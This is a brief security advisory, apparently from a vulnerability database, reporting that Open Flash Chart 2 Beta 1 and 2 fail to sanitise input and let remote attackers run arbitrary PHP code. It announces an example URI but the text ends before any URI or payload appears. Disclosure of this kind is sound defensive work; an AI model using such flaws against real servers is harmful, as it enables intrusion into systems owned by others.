Exploit:
 
Open Flash Chart is prone to a vulnerability that lets remote attackers
execute arbitrary code because the application fails to sanitize
user-supplied input.
 
Attackers can exploit this issue to execute arbitrary PHP code within the
context of the affected webserver process.
 
Open Flash Chart 2 Beta 1 and Open Flash Chart 2 are vulnerable; other
versions may also be affected.
 
The following example URI is available:
